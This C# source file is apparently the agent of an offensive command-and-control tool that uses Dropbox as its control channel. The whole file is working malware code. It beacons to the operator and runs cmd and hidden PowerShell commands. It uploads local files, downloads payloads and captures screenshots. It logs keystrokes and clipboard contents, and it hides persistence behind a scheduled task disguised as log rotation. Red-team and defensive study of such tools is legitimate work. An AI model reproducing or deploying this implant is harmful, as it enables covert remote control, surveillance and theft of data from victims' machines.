/*
Author: Arno0x0x, Twitter: @Arno0x0x

-------------------- x64 platform ----------------
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:dbc2_agent.exe *.cs

Or, with debug information:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /define:DEBUG /out:dbc2_agent_debug.exe *.cs

-------------------- x86 platform ----------------
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:dbc2_agent.exe *.cs

Or, with debug information:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /define:DEBUG /out:dbc2_agent_debug.exe *.cs
*/

using System;
using System.Threading;
using System.IO;
using System.Text;
using System.Management;
using System.Net.NetworkInformation;
using System.Diagnostics;

namespace dropboxc2
{
    //****************************************************************************************
    // Main class
    //****************************************************************************************
    public class C2_Agent
    {
        //--------------------------------------------------------------------------------------------------
        // Class global variables
        Mutex mutex = null; // Mutex used to ensure there's only one agent running at a time
        int pollingPeriod = 8000; // Nominal polling period in milliseconds
        int deviation = 20; // Deviation is a percentage of variation around the polling period
        int sleepTime = 0; // Actual sleeping period: a random result based on the pollingPeriod and the deviation
        string agentID = String.Empty;
        string c2StatusFile = String.Empty; // The status file that will be used to notify about the agent status
        string c2StatusFileLastRevNumber = String.Empty; // The last revision number for the status file
        string c2CmdFile = String.Empty; // The Command file that will be used to receive commands
        string c2CmdFileLastRevNumber = String.Empty; // The last revision number for the command file
        StringBuilder keylogged; // All data logged by the keylogger thread
        StringBuilder clipboardLogged; // All data logged by the clipboard logger thread

        //--------------------------------------------------------------------------------------------------
        // Shell mode variables
        bool shellMode = false;
        Process shellProcess = null; // The child process used for a more interactive shell
        private static StringBuilder shellOutput = new StringBuilder();
        int savedPollingPeriod = 0;
        int savedDeviation = 0;

        //==================================================================================================
        // Main program function
        //==================================================================================================
        public static void Main(string[] args)
        {   
            string accessToken = String.Empty;
            byte[] cryptoKey;

            //---------------------------------------------------------------------
            // Check arguments have been passed
            if (args.Length == 2)
            {
                // Retrieve AccessToken and CryptoKey from passed arguments
                accessToken = args[0];
                cryptoKey = Convert.FromBase64String(args[1]);    
            }
            else
            {
                return;
            }
            

            //---------------------------------------------------------------------
            // Create an instance of the C2_Agent
            C2_Agent c2_agent = new C2_Agent();
            
            // Get a unique ID for the machine this agent is running on
            c2_agent.agentID = c2_agent.createAgentID();
            c2_agent.mutex = new Mutex(false, @"Global\" + c2_agent.agentID);

            // Check if another instance of an agent is already running
            if(!c2_agent.mutex.WaitOne(0, false))
            {
#if (DEBUG)
                Console.WriteLine("[ERROR] Another instance of the agent is already running");
#endif
                return;
            }
                        
            //---------------------------------------------------------------------
#if (DEBUG)
            Console.WriteLine("------------ AGENT STARTING ------------");
#endif
                     
            // Break flag used to exit the agent
            bool breakFlag = false;

            
            c2_agent.c2StatusFile = "/" + c2_agent.agentID + ".status";
            c2_agent.c2CmdFile = "/" + c2_agent.agentID + ".cmd";

            // Initializing a DropboxHandler object to handle all communications with the Dropbox C2 server
            DropboxHandler dropboxHandler = new DropboxHandler(accessToken);

            #if (DEBUG)
                Console.WriteLine("[Main] Uploading status and command file to the C2 server");
            #endif

            // Create the c2StatusFile and c2CmdFile on the Dropbox server. These files act as an unique identifier for this agent
            // as well as a receiver for commands from the server
            c2_agent.c2CmdFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2CmdFile, Encoding.ASCII.GetBytes(""));
            c2_agent.c2StatusFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2StatusFile, Encoding.ASCII.GetBytes(""));

            if (c2_agent.c2StatusFileLastRevNumber == String.Empty || c2_agent.c2CmdFileLastRevNumber == String.Empty)
            {
#if (DEBUG)
                Console.WriteLine("[Main][ERROR] Cannot create files on the C2 server");
#endif

                breakFlag = true;
            }
            else {
#if (DEBUG)
                Console.WriteLine("[Main] C2 Files created - Agent ready");
#endif
            }

            // Set initial sleep time to the nominal polling period with a deviation
            c2_agent.sleepTime = c2_agent.getRandomPeriod();

            //---------------------------------------------------------------------------------
            // Main loop
            //---------------------------------------------------------------------------------
            while (!breakFlag)
            {
#if (DEBUG)
                Console.WriteLine("[Main loop] Going to sleep for " + c2_agent.sleepTime / 1000 + " seconds");
#endif
                // Wait for the polling period to time out
                Thread.Sleep(c2_agent.sleepTime);
#if (DEBUG)
                Console.WriteLine("[Main loop] Waking up");
#endif

                // Calculate next sleep time
                c2_agent.sleepTime = c2_agent.getRandomPeriod();

                //----------------------------------------------------------------------------
                // Check if we're in shellMode
                if (c2_agent.shellMode)
                {
                    // So we're in shell mode, is there some shell output to push to the C2 ?
                    int currentLength = shellOutput.Length;
                    if (currentLength > 0)
                    {
                        string output = shellOutput.ToString(0, currentLength);
                        shellOutput.Remove(0, currentLength);
                        dropboxHandler.putFile("/" + c2_agent.agentID + ".dd", Crypto.EncryptData(Encoding.UTF8.GetBytes(output), cryptoKey));
                    }
                }

                //----------------------------------------------------------------------------
                // At each cycle, 'touch' the status file to show the agent is alive = beaconing
                c2_agent.c2StatusFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2StatusFile, Encoding.ASCII.GetBytes("READY - " + DateTime.Now.ToString()));

                // Check the c2 command File revision number
                string revNumber = dropboxHandler.getRevNumber(c2_agent.c2CmdFile);
                if (revNumber == String.Empty)
                {
#if (DEBUG)
                    Console.WriteLine("[Main loop][ERROR] Unable to get the revision number for the command file");
#endif
                    // There was an error retrieving the last revision number, skip this turn
                    continue;
                }

                //----------------------------------------------------------------------------
                // If the revision number is different, that means there's a new command to be treated
                if (revNumber != c2_agent.c2CmdFileLastRevNumber)
                {
#if (DEBUG)
                    Console.WriteLine("[Main loop] Command file has a new revision number: [" + revNumber + "]");
#endif

                    c2_agent.c2CmdFileLastRevNumber = revNumber;

                    // Read the content of the C2 file
                    string content = Encoding.UTF8.GetString(Crypto.DecryptData(dropboxHandler.readFile(c2_agent.c2CmdFile), cryptoKey));
                    if (content == String.Empty)
                    {
#if (DEBUG)
                        Console.WriteLine("[Main loop][ERROR] C2 command file on the server seems empty...");
#endif
                        continue;
                    }

                    //---------------------------------------------------------------------------------------------------
                    // Parse the received command to extract all required fields
                    StringReader strReader = new StringReader(content);
                    string result = String.Empty;
                    string command = strReader.ReadLine();
                    string taskID = strReader.ReadLine();
                    string taskResultFile = "/" + c2_agent.agentID + "." + taskID;

#if (DEBUG)
                    Console.WriteLine("[Main loop] Command to execute: [" + command + "]");
#endif

                    //---------------------------------------------------------------------------------------------------
                    // Command routing
                    //---------------------------------------------------------------------------------------------------
                    switch (command)
                    {
                        case "shell":
                            string shellCommand = strReader.ReadLine();
                            c2_agent.shellMode = true;

#if (DEBUG)
                            Console.WriteLine("\t[shell] Executing: [" + shellCommand + "]");
#endif

                            // Send the command to the child process
                            c2_agent.runShell(shellCommand);
                            break;

                        case "runCLI":
                            string commandLine = strReader.ReadLine();

#if (DEBUG)
                            Console.WriteLine("\t[runCLI] Executing: [" + commandLine + "]");
#endif

                            // Execute the command
                            result = c2_agent.runCMD(commandLine);

                            if (result == null)
                            {
                                result = "ERROR - COULD NOT EXECUTE COMMAND:" + commandLine;
#if (DEBUG)
                                Console.WriteLine("\t[runCLI][ERROR] External command did not executed properly");
#endif
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.UTF8.GetBytes(result), cryptoKey));
                            break;

                        case "launchProcess":
                            string exeName = strReader.ReadLine();
                            string arguments = strReader.ReadLine();

#if (DEBUG)
                            Console.WriteLine("\t[launchProcess] Executing: [" + exeName + " " + arguments + "]");
#endif

                            // Execute the command
                            if (c2_agent.launchProcess(exeName, arguments))
                            {
                                result = "OK - PROCESS STARTED: " + exeName + arguments;
                            } else
                            {
                                result = "ERROR - COULD NOT EXECUTE: " + exeName + " " + arguments;
#if (DEBUG)
                                Console.WriteLine("\t[launchProcess][ERROR] External command did not executed properly");
#endif
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "sendFile":
                            string localFile = strReader.ReadLine();
                            string remoteFile = taskResultFile + ".rsc";

#if (DEBUG)
                            Console.WriteLine("\t[sendFile] Uploading file [" + localFile + "] to [" + remoteFile + "]");
#endif

                            if (File.Exists(localFile))
                            {
                                // First push the wanted local file to the C2 server
                                dropboxHandler.putFile(remoteFile, Crypto.EncryptData(File.ReadAllBytes(localFile), cryptoKey));

#if (DEBUG)
                                Console.WriteLine("\t[sendFile] File uploaded");
#endif

                                // The task result is the path to the uploaded resource file
                                result = remoteFile;

                            } else
                            {
                                // Push the command result to the C2 server
                                result = "ERROR - FILE NOT FOUND: " + localFile;
#if (DEBUG)
                                Console.WriteLine("\t[sendFile][ERROR] Command did not executed properly. Localfile not found : [" + localFile + "]");
#endif
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "downloadFile":
                            remoteFile = strReader.ReadLine();
                            string localPath = strReader.ReadLine();
                            string fileName = strReader.ReadLine();

                            if (localPath == "temp")
                            {
                                localPath = Path.GetTempPath();
                            }

#if (DEBUG)
                            Console.WriteLine("\t[downloadFile] Downloading file from [" + remoteFile + "] to [" + localPath + fileName + "]");
#endif

                            if (dropboxHandler.downloadFile(remoteFile, localPath + fileName))
                            {
#if (DEBUG)
                                Console.WriteLine("\t[downloadFile] File downloaded");
#endif
                                result = "OK - FILE DOWNLOADED AT: " + localPath + fileName;
                            } else
                            {
#if (DEBUG)
                                Console.WriteLine("\t[downloadFile][ERROR] Could not download file");
#endif
                                result = "ERROR - COULD NOT WRITE FILE AT LOCATION: " + localPath + fileName;
                            }

                            // remote file must be deleted
                            dropboxHandler.deleteFile(remoteFile);

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "sleep":
                            int sleepTime;
                            string value = strReader.ReadLine();
                            if (Int32.TryParse(value, out sleepTime))
                            {
                                c2_agent.sleepTime = sleepTime * 60 * 1000;

#if (DEBUG)
                                Console.WriteLine("\t[sleep] Next sleep is: " + sleepTime + " minute(s)");
#endif

                                // Compute wake up time
                                DateTime wakeUpTime = DateTime.Now.AddMinutes(sleepTime);
                                result = "SLEEPING" + "," + wakeUpTime.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ");

                                c2_agent.c2StatusFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2StatusFile, Encoding.ASCII.GetBytes(result));
                            } else
                            {
#if (DEBUG)
                                Console.WriteLine("\t[sleep][ERROR] Invalid amount of time specified [" + value + "]");
#endif
                                result = "ERROR - INVALID AMOUNT OF TIME FOR SLEEP: " + value;
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "polling":
                            int period, deviation;
                            string value1 = strReader.ReadLine();
                            string value2 = strReader.ReadLine();
                            if (Int32.TryParse(value1, out period) && Int32.TryParse(value2, out deviation))
                            {
                                c2_agent.pollingPeriod = period * 1000;
                                c2_agent.deviation = deviation;

#if (DEBUG)
                                Console.WriteLine("\t[polling] Polling period changed to {0}s with a deviation of {1}% ", period, deviation);
#endif

                                result = "OK - PERIOD AND DEVIATION CHANGED";
                            }
                            else
                            {
#if (DEBUG)
                                Console.WriteLine("\t[polling][ERROR] Invalid value for period or deviation [{0}] / [{1}] of {1}% ", value1, value2);
#endif
                                result = "ERROR - INVALID INTEGER VALUE FOR PERIOD AND/OR DEVIATION: " + value1 + value2;
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "screenshot":
                            // Set the screenshot file name on the C2 server
                            remoteFile = taskResultFile + ".rsc";

#if (DEBUG)
                            Console.WriteLine("\t[screenshot] Taking screenshot and converting it to a JPG image");
#endif

                            // Push the image to the C2 server
                            dropboxHandler.putFile(remoteFile, Crypto.EncryptData(Screenshot.takeScreenShot(), cryptoKey));

                            // The task result is the path to the uploaded screenshot file
                            result = remoteFile;

#if (DEBUG)
                            Console.WriteLine("\t[screenshot] Uploading JPG screenshot to [" + remoteFile + "]");
#endif

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "keylogger":
                            string action = strReader.ReadLine();

                            if (action == "start")
                            {
                                c2_agent.keylogged = new StringBuilder();
                                // Start the keylogging function
                                KeyLogger.OnKeyDown += key => { c2_agent.keylogged.Append("d[" + key + "]\n"); };
                                KeyLogger.OnKeyUp += key => { c2_agent.keylogged.Append("u[" + key + "]\n"); };
                                KeyLogger.Start();
#if (DEBUG)
                                Console.WriteLine("\t[keylogger] KeyLogger started");
#endif

                                result = "OK - KeyLogger started";
                            }
                            else
                            {
                                KeyLogger.Stop();
                                result = c2_agent.keylogged.ToString();
                                c2_agent.keylogged.Clear();
#if (DEBUG)
                                Console.WriteLine("\t[keylogger] KeyLogger stopped");
#endif
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "clipboardlogger":
                            action = strReader.ReadLine();

                            if (action == "start")
                            {
                                c2_agent.clipboardLogged = new StringBuilder();
                                // Start the keylogging function
                                ClipboardLogger.OnKeyBoardEvent += text => { c2_agent.clipboardLogged.Append(text+"\n");};
                                ClipboardLogger.Start();
#if (DEBUG)
                                Console.WriteLine("\t[clipboardlogger] Clipboard Logger started");
#endif

                                result = "OK - Clipboard logger started";
                            }
                            else
                            {
                                ClipboardLogger.Stop();
                                result = c2_agent.clipboardLogged.ToString();
                                c2_agent.clipboardLogged.Clear();
#if (DEBUG)
                                Console.WriteLine("\t[clipboardlogger] Clipboard logger stopped");
#endif
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "sendkeystrokes":
                            string procName = strReader.ReadLine();
                            string keys = strReader.ReadLine();

                            Process[] pList= Process.GetProcessesByName(procName);

                            if( pList.Length > 0)
                            {
                                Process p = pList[0];

#if (DEBUG)
                                Console.WriteLine("\t[sendkeystrokes] Sending key strokes to process " + procName + "\n" + keys);
#endif
                                if (KeyStrokes.sendKeyStrokes(p, keys))
                                {
                                    result = "OK - Key strokes sent to process " + procName;
                                }
                                else
                                {
                                    result = "ERROR - Could not send key strokes to the process, probably wrong keystrokes sequence";
                                }
                                
                            }
                            else
                            {
#if (DEBUG)
                                Console.WriteLine("\t[sendkeystrokes] Error, could not find process with name " + procName);
#endif
                                result = "ERROR - Could not find a process with name " + procName;
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "persist":
                            // Get the current command line through which the stage was started, and 
                            string oneLiner = Environment.CommandLine;
#if (DEBUG)
                            Console.WriteLine("\t[persist] Setting agent persistency through scheduled task");
#endif
                            // Create a fake/misleading batch script in the user's profile
                            string fileDir = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\AppData\Local\WindowsUserLogRotate");
                            Directory.CreateDirectory(fileDir);
                            string filePath = fileDir + @"\logrotate.bat";
                            System.IO.File.WriteAllText(filePath, oneLiner);

                            commandLine = "schtasks /create /TN 'WindowsUserLogRotate' /TR '" + filePath +"' /SC ONIDLE /i 20";
                            result = c2_agent.runCMD(commandLine);

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.UTF8.GetBytes(result), cryptoKey));
                            break;

                        case "stop":
#if (DEBUG)
                            Console.WriteLine("\t[stop] Stopping agent");
#endif

                            result = "OK - STOPPING";
                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));

                            breakFlag = true;
                            break;
                    }
                } else
                {
#if (DEBUG)
                    Console.WriteLine("[Main loop] revNumber [" + revNumber + "] hasn't changed, nothing to treat");
#endif
                }
            }
#if (DEBUG)
            Console.WriteLine("[Main] Exiting... ");
#endif
        }

        //==================================================================================================
        // This method returns a random pollingPeriod using an average value and a deviation around that value
        //==================================================================================================
        private int getRandomPeriod()
        {
            Random random = new Random((int)DateTime.Now.Ticks);
            return random.Next(pollingPeriod - pollingPeriod * deviation / 100, pollingPeriod + pollingPeriod * deviation / 100); // Current sleep time, if agent is sleeping, this value increases
        }

        ///==================================================================================================
        // This method runs a command in a spawned child process (powershell.exe). The child process is
        // kept alive until it is explicitely exited. This allows for contextual commands and persistent
        // environment between commands.
        //==================================================================================================
        private void runShell(string command)
        {
            try
            {
                // Check if we already have a shell child process running
                // If not, start it and create the output and error data received callback
                if (shellProcess == null) {

                    // Save the current period and deviation
                    savedPollingPeriod = pollingPeriod;
                    savedDeviation = deviation;

                    // Set a shorter polling perdio for better interaction
                    pollingPeriod = 2000;
                    deviation = 0;

#if (DEBUG)
                    Console.WriteLine("\t\t[runShellCmd] Spawning a child process");
#endif

                    ProcessStartInfo procStartInfo = new ProcessStartInfo();
                    procStartInfo.UseShellExecute = false;
                    procStartInfo.RedirectStandardInput = true;
                    procStartInfo.RedirectStandardOutput = true;
                    procStartInfo.RedirectStandardError = true;
                    procStartInfo.FileName = "powershell.exe";
                    procStartInfo.Arguments = "\"-\"";
                    procStartInfo.CreateNoWindow = true;
                    procStartInfo.ErrorDialog = false;

                    shellProcess = new Process();
                    shellProcess.StartInfo = procStartInfo;
                    shellProcess.EnableRaisingEvents = true;

                    shellProcess.OutputDataReceived += (sender, e) =>
                    {
                        if (!String.IsNullOrEmpty(e.Data))
                        {
#if (DEBUG)
                            Console.WriteLine(e.Data);
#endif
                            shellOutput.Append(e.Data + "\n");
                        }
                    };

                    shellProcess.ErrorDataReceived += (sender, e) =>
                    {
                        if (!String.IsNullOrEmpty(e.Data))
                        {
#if (DEBUG)
                            Console.WriteLine(e.Data);
#endif
                            shellOutput.Append(e.Data + "\n");
                        }
                    };

                    shellProcess.Exited += (sender, e) =>
                    {
                        shellMode = false;
                        pollingPeriod = savedPollingPeriod;
                        deviation = savedDeviation;
                        shellOutput.Clear();
                        shellProcess = null;
                    };

                    shellProcess.Start();
                    shellProcess.BeginOutputReadLine();
                    shellProcess.BeginErrorReadLine();
                }

                // Write the command to stdin
                shellProcess.StandardInput.WriteLine(command);
            }
            catch (Exception ex)
            {
                // Log the exception
#if (DEBUG)
                while (ex != null)
                {
                    Console.WriteLine("[ERROR] " + ex.Message);
                    ex = ex.InnerException;
                }
#endif
            }
        }

        //==================================================================================================
        // This method runs an external command line on the sytem, using the windows interpreter (cmd.exe).
        // It returns the command result (output or error)
        //==================================================================================================
        private string runCMD(string command)
        {
            string result = null;
            try
            {
                // create the ProcessStartInfo using "cmd" as the program to be run and "/c " as the parameters.
                // Incidentally, /c tells cmd that we want it to execute the command that follows and then exit.
                ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command);

                // Redirect both the standard output and the standard error stream
                // This means that it will be redirected to the Process.StandardOutput StreamReader.
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.RedirectStandardError = true;
                procStartInfo.UseShellExecute = false;

                // Run silently, do not create a console window
                procStartInfo.CreateNoWindow = true;

                // Create a process, assign its ProcessStartInfo and start it
                System.Diagnostics.Process proc = new Process();
                proc.StartInfo = procStartInfo;
                proc.Start();

                // Get the output into a string
                result = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();

                // If there was an error, read the standard error stream
                if (proc.ExitCode != 0) result += proc.StandardError.ReadToEnd();

                // Return the command output
                return result;
            }
            catch (Exception ex)
            {
                // Log the exception
                #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);
                        ex = ex.InnerException;
                    }
                #endif
                return result;
            }
        }

        //==================================================================================================
        // This method launches an external executable.
        // It returns true if the process was launched, false otherwise
        //==================================================================================================
        private bool launchProcess(string exeName, string args)
        {
            try
            {
                ProcessStartInfo procStartInfo = new ProcessStartInfo(exeName, args);
                procStartInfo.UseShellExecute = false;

                // Run silently, do not create a console window
                procStartInfo.CreateNoWindow = true;

                // Create a process, assign its ProcessStartInfo and start it
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();

                return true;
            }
            catch (Exception ex)
            {
                // Log the exception
#if (DEBUG)
                while (ex != null)
                {
                    Console.WriteLine("[ERROR] " + ex.Message);
                    ex = ex.InnerException;
                }
#endif
                return false;
            }
        }

        //==================================================================================================
        // createAgentID method
        // This method returns a unique ID for the machine it's running on.
        // Ideally, the ID has to be unique worldwide as multiple agents may run on various machine and refer to the same C2 server
        //==================================================================================================
        private string createAgentID()
        {
            string uniqueID = string.Empty;

            //-------------------------------------------------------------
            // First, get the CPU ID. Only the first CPU ID gets retrieved
            string cpuID = string.Empty;
            ManagementClass mc = new ManagementClass("win32_processor");
            ManagementObjectCollection moc = mc.GetInstances();

            foreach (ManagementObject mo in moc)
            {
                if (cpuID == "")
                {
                    cpuID = mo.Properties["processorID"].Value.ToString();
                }
            }

            //-------------------------------------------------------------
            // Second, get the MAC address from the first NIC interface found
            string sMacAddress = string.Empty;
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)// only return MAC Address from first card  
                {
                    //IPInterfaceProperties properties = adapter.GetIPProperties(); Line is not required
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            }

            //-------------------------------------------------------------
            // Eventually, compute a MD5 hash of both cpuID and sMacAddress
            byte[] tmpSource, tmpHash;
            tmpSource = Encoding.Unicode.GetBytes(cpuID + sMacAddress);
            tmpHash = Crypto.GetMD5Hash(tmpSource);
            uniqueID = BitConverter.ToString(tmpHash).Replace("-", string.Empty).ToLower();

            return uniqueID;
        }
    }   
}